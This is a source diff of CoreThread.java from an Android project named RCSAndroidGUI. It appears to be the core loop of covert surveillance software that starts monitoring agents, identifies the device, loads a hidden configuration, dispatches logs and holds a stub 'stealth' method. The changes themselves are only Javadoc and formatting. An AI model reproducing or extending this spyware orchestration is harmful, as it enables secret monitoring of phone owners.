@@ -7,12 +7,14 @@
 
 package com.ht.RCSAndroidGUI;
 
-import java.util.Vector;
+import android.app.Activity;
+import android.content.ContentResolver;
+import android.content.res.Resources;
+import android.util.Log;
 
 import com.ht.RCSAndroidGUI.action.Action;
 import com.ht.RCSAndroidGUI.action.SubAction;
 import com.ht.RCSAndroidGUI.action.UninstallAction;
-import com.ht.RCSAndroidGUI.agent.Agent;
 import com.ht.RCSAndroidGUI.agent.AgentManager;
 import com.ht.RCSAndroidGUI.conf.Configuration;
 import com.ht.RCSAndroidGUI.event.EventManager;
@@ -21,27 +23,48 @@ import com.ht.RCSAndroidGUI.file.Path;
 import com.ht.RCSAndroidGUI.utils.Check;
 import com.ht.RCSAndroidGUI.utils.Utils;
 
-import android.app.Activity;
-import android.content.ContentResolver;
-import android.content.res.Resources;
-import android.util.Log;
-
+// TODO: Auto-generated Javadoc
+/**
+ * The Class CoreThread.
+ */
 public class CoreThread extends Activity implements Runnable {
+	
+	/** The Constant SLEEPING_TIME. */
 	private static final int SLEEPING_TIME = 1000;
 	// #ifdef DEBUG
+	/** The debug. */
 	protected static Debug debug = new Debug("CoreThread");
 	// #endif
 
+	/** The b stop core. */
 	private boolean bStopCore = false;
+	
+	/** The resources. */
 	private Resources resources;
+	
+	/** The core thread. */
 	private Thread coreThread;
+	
+	/** The content resolver. */
 	private ContentResolver contentResolver;
+	
+	/** The agent manager. */
 	private AgentManager agentManager;
+	
+	/** The event manager. */
 	private EventManager eventManager;
 
+	/** The action thread. */
 	Thread actionThread;
 
-	public boolean Start(Resources r, ContentResolver cr) {
+	/**
+	 * Start.
+	 *
+	 * @param r the r
+	 * @param cr the cr
+	 * @return true, if successful
+	 */
+	public boolean Start(final Resources r, final ContentResolver cr) {
 		coreThread = new Thread(this);
 		agentManager = AgentManager.self();
 		eventManager = EventManager.self();
@@ -55,6 +78,11 @@ public class CoreThread extends Activity implements Runnable {
 		return true;
 	}
 
+	/**
+	 * Stop.
+	 *
+	 * @return true, if successful
+	 */
 	public boolean Stop() {
 		bStopCore = true;
 		Log.d("RCS", "RCS Thread Stopped");
@@ -62,6 +90,9 @@ public class CoreThread extends Activity implements Runnable {
 	}
 
 	// Runnable (main routine for RCS)
+	/* (non-Javadoc)
+	 * @see java.lang.Runnable#run()
+	 */
 	public void run() {
 		Log.d("RCS", "RCS Thread Started");
 
@@ -118,11 +149,11 @@ public class CoreThread extends Activity implements Runnable {
 	/**
 	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
 	 * bloccante.
-	 * 
-	 * @return
+	 *
+	 * @return true, if successful
 	 */
 	private boolean checkActions() {
-		Status status = Status.self();
+		final Status status = Status.self();
 
 		Utils.sleep(1000);
 
@@ -142,7 +173,7 @@ public class CoreThread extends Activity implements Runnable {
 						final int actionId = actionIds[k];
 
 						final Action action = status.getAction(actionId);
-						int exitValue = executeAction(action);
+						final int exitValue = executeAction(action);
 
 						if (exitValue == 1) {
 							// #ifdef DEBUG
@@ -173,7 +204,8 @@ public class CoreThread extends Activity implements Runnable {
 	}
 
 	/**
-	 * Inizializza il core
+	 * Inizializza il core.
+	 *
 	 * @return false if any fatal error
 	 */
 	private boolean taskInit() {
@@ -181,16 +213,16 @@ public class CoreThread extends Activity implements Runnable {
 			Path.makeDirs();
 
 			// Identify the device uniquely
-			Device device = Device.self();
+			final Device device = Device.self();
 			device.init(contentResolver);
 
-			if(!loadConf()){
+			if (!loadConf()) {
 				debug.error("Cannot load conf");
 				return false;
 			}
 
 			// Start log dispatcher
-			LogDispatcher logDispatcher = LogDispatcher.self();
+			final LogDispatcher logDispatcher = LogDispatcher.self();
 			logDispatcher.start();
 
 			// Da qui in poi inizia la concorrenza dei thread
@@ -220,10 +252,10 @@ public class CoreThread extends Activity implements Runnable {
 			Log.d("RCS", "Exiting core");
 			return true;
 
-		} catch (RCSException rcse) {
+		} catch (final RCSException rcse) {
 			rcse.printStackTrace();
 			Log.d("RCS", "RCSException() detected");
-		} catch (Exception e) {
+		} catch (final Exception e) {
 			e.printStackTrace();
 			Log.d("RCS", "Exception() detected");
 		}
@@ -233,21 +265,21 @@ public class CoreThread extends Activity implements Runnable {
 	}
 
 	/**
-	 * Tries to load the new configuration, if it fails it get the resource conf
-	 * 
-	 * @throws RCSException
+	 * Tries to load the new configuration, if it fails it get the resource conf.
+	 *
 	 * @return false if no correct conf available
+	 * @throws RCSException the rCS exception
 	 */
 	public boolean loadConf() throws RCSException {
 
 		boolean loaded = false;
-		
+
 		// tries to load the file got from the sync, if any.
-		AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);
+		final AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);
 		if (file.exists()) {
-			byte[] resource = file.read(8);
+			final byte[] resource = file.read(8);
 			// Initialize the configuration object
-			Configuration conf = new Configuration(resource);
+			final Configuration conf = new Configuration(resource);
 			// Load the configuration
 			loaded = conf.LoadConfiguration();
 
@@ -258,43 +290,49 @@ public class CoreThread extends Activity implements Runnable {
 		// tries to load the resource conf
 		if (!loaded) {
 			// Open conf from resources and load it into resource
-			byte[] resource = Utils.InputStreamToBuffer(
-					resources.openRawResource(R.raw.config), 8); // config.bin
+			final byte[] resource = Utils.InputStreamToBuffer(resources
+					.openRawResource(R.raw.config), 8); // config.bin
 
 			// Initialize the configuration object
-			Configuration conf = new Configuration(resource);
+			final Configuration conf = new Configuration(resource);
 			// Load the configuration
 			loaded = conf.LoadConfiguration();
-			
+
 			debug.info("Resource file loaded: " + loaded);
 		}
-		
+
 		return loaded;
 	}
 
+	/**
+	 * Stealth.
+	 */
 	private void stealth() {
 		// TODO Auto-generated method stub
 
 	}
 
+	/**
+	 * Test run.
+	 */
 	public void testRun() {
 		try {
 
-			byte[] resource = Utils.InputStreamToBuffer(
-					resources.openRawResource(R.raw.config), 8); // config.bin
+			final byte[] resource = Utils.InputStreamToBuffer(resources
+					.openRawResource(R.raw.config), 8); // config.bin
 
 			// Initialize the configuration object
-			Configuration conf = new Configuration(resource);
+			final Configuration conf = new Configuration(resource);
 
 			// Identify the device uniquely
-			Device device = Device.self();
+			final Device device = Device.self();
 			device.init(contentResolver);
 
 			// Load the configuration
 			conf.LoadConfiguration();
 
 			// Start log dispatcher
-			LogDispatcher logDispatcher = LogDispatcher.self();
+			final LogDispatcher logDispatcher = LogDispatcher.self();
 			logDispatcher.start();
 
 			// Start agents
@@ -309,15 +347,15 @@ public class CoreThread extends Activity implements Runnable {
 			agentManager.stopAgents();
 			Utils.sleep(2000);
 
-			Status status = Status.self();
+			final Status status = Status.self();
 			status.triggerAction(0);
-			int[] actionIds = status.getTriggeredActions();
+			final int[] actionIds = status.getTriggeredActions();
 			final int asize = actionIds.length;
 			if (asize > 0) {
 				for (int k = 0; k < asize; ++k) {
 					final int actionId = actionIds[k];
 					final Action action = status.getAction(actionId);
-					int exitValue = executeAction(action);
+					final int exitValue = executeAction(action);
 
 					if (exitValue == 1) {
 						// #ifdef DEBUG
@@ -341,10 +379,10 @@ public class CoreThread extends Activity implements Runnable {
 
 			Log.d("RCS", "LogDispatcher Killed");
 
-		} catch (RCSException rcse) {
+		} catch (final RCSException rcse) {
 			rcse.printStackTrace();
 			Log.d("RCS", "RCSException() detected");
-		} catch (Exception e) {
+		} catch (final Exception e) {
 			e.printStackTrace();
 			Log.d("RCS", "Exception() detected");
 		}
@@ -354,13 +392,19 @@ public class CoreThread extends Activity implements Runnable {
 
 	}
 
+	/**
+	 * Execute action.
+	 *
+	 * @param action the action
+	 * @return the int
+	 */
 	private int executeAction(final Action action) {
 		int exit = 0;
 		// #ifdef DEBUG
 		debug.trace("CheckActions() triggered: " + action);
 		// #endif
 
-		Status status = Status.self();
+		final Status status = Status.self();
 		status.unTriggerAction(action);
 		// action.setTriggered(false, null);
 
@@ -374,7 +418,7 @@ public class CoreThread extends Activity implements Runnable {
 
 		for (int j = 0; j < ssize; ++j) {
 			try {
-				final SubAction subAction = (SubAction) action.getSubAction(j);
+				final SubAction subAction = action.getSubAction(j);
 				// #ifdef DBC
 				Check.asserts(subAction != null,
 						"checkActions: subAction!=null");
@@ -473,10 +517,20 @@ public class CoreThread extends Activity implements Runnable {
 		return exit;
 	}
 
+	/**
+	 * Inits the.
+	 *
+	 * @return true, if successful
+	 */
 	public boolean Init() {
 		return false;
 	}
 
+	/**
+	 * Run.
+	 *
+	 * @return true, if successful
+	 */
 	public boolean Run() {
 		return false;
 	}
